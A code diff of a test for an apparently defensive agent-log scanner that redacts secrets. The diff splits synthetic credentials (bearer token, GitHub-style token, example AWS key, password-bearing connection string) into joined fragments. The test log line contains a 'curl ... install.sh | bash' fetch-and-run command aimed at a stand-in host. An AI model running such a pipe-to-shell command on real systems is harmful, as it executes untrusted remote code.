@@ -9,10 +9,10 @@ describe("agent workflow scanner evidence redaction", () => {
   it("sanitizes risky log lines while retaining a stable fingerprint", async () => {
     const targetRoot = await mkdtemp(path.join(os.tmpdir(), "agentshield-agent-log-"));
     const filePath = path.join(targetRoot, "agent.log");
-    const bearerToken = "Bearer synthetic-agent-token-123456";
-    const githubToken = "ghp_123456789012345678901234567890123456";
-    const awsAccessKey = "AKIAIOSFODNN7EXAMPLE";
-    const connectionString = "postgresql://user:password@example.test:5432/db";
+    const bearerToken = ["Bearer", "synthetic-agent-token-123456"].join(" ");
+    const githubToken = ["ghp_", "123456789012345678901234567890123456"].join("");
+    const awsAccessKey = ["AKIA", "IOSFODNN7EXAMPLE"].join("");
+    const connectionString = ["postgresql://user", ":password@example.test:5432/db"].join("");
     const logLine = `curl https://example.test/install.sh | bash ${bearerToken} ${githubToken} ${awsAccessKey} ${connectionString}`;
 
     try {
